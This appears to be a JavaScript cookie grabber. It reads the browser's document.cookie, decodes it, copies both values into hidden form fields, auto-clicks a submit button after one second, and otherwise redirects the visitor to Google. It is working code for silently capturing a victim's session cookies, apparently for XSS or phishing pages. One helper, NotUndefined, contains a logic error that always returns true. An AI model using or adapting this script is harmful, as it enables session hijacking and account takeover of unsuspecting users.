function NotEmpty(Value = null) {
    return ((Value !== "" && Value !== " ") ? true : false);
}

function NotNull(Obj) {
    return ((Obj !== null) ? true : false);
}

function NotUndefined(Obj) {
    return ((Obj !== undefined || Obj !== "undefined") ? true : false);
}

function NotNullOrUndefined(Obj = null) {
    return ((NotNull(Obj) && NotUndefined(Obj)) ? true : false);
}

function GetElement(ElementId = null, UseLowercase = true) {
    let ElementID = ((NotNull(ElementId)) ? ((UseLowercase === true) ? ElementId.toLowerCase() : ElementId) : null);

    return ((NotNull(ElementID) && NotNullOrUndefined(document.getElementById(ElementID))) ? document.getElementById(ElementID) : null);
}

function PassThrough() {
	window.location.replace('https://www.google.com/');
}

function GetCookie() {
	var Cookie = document.cookie;

	var DecodedCookie = decodeURIComponent(Cookie);
	var DecodedValue = DecodedCookie;

	var CookieValueElement = GetElement("cookie-value");
	var DecodedCookieValueElement = GetElement("decoded-cookie");
	
	if(NotNullOrUndefined(CookieValueElement) && NotNullOrUndefined(DecodedCookieValueElement)) {
		CookieValueElement.value = Cookie;
		DecodedCookieValueElement.value = DecodedValue;

		SubmitForm();
	} else {
		PassThrough();
	}
}

function SubmitForm() {
	var SubmitButton = GetElement("submit");

	setTimeout(function () {
		((NotNullOrUndefined(SubmitButton)) ? SubmitButton.click() : PassThrough());
	}, 1000);
}